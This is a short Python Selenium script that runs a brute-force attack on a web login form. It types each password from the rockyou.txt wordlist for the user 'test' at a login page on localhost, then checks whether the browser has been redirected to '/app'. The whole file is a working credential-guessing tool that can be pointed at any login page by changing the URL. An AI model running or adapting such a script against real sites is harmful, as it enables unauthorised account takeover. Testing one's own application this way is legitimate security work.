import time

from selenium import webdriver
from selenium.webdriver.common.by import By


username = "test"
options = webdriver.ChromeOptions()
options.add_argument("--headless=new")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.binary_location = "/usr/bin/helium-browser"

driver = webdriver.Chrome(
    options=options,
)
driver.implicitly_wait(2)

print("Starting brute-force attack...")

driver.get("http://localhost:5173/login")

print("Loaded login page. Starting to try passwords from rockyou.txt...")
username_input = driver.find_element(By.ID, "username")
username_input.clear()
username_input.send_keys(username)

with open("rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        password_input = driver.find_element(By.ID, "password")
        password_input.clear()
        password_input.send_keys(password)
        print(f"Trying password: {password}")
        driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()

        start = time.time()
        while time.time() - start < 2:  # Wait up to 5 seconds
            if "/app" in driver.current_url:
                print(f"Success! Found password: {password} for username: {username}")
                driver.quit()
                exit(0)

        print("Login failed, trying next password...")

driver.quit()
